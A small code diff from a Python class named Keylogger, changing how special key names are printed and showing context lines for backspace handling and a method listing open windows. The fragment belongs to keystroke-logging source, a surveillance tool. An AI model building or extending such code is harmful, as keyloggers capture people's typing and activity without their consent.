@@ -45,7 +45,7 @@ class Keylogger:
             elif keyname == 'backspace':
                 sys.stdout.write('\b')
             else:
-                print(f"SPECIAL_{keyname}", end = '')
+                print(f" SPECIAL_{keyname} ", end = '')
 
 
     def get_open_windows(self):
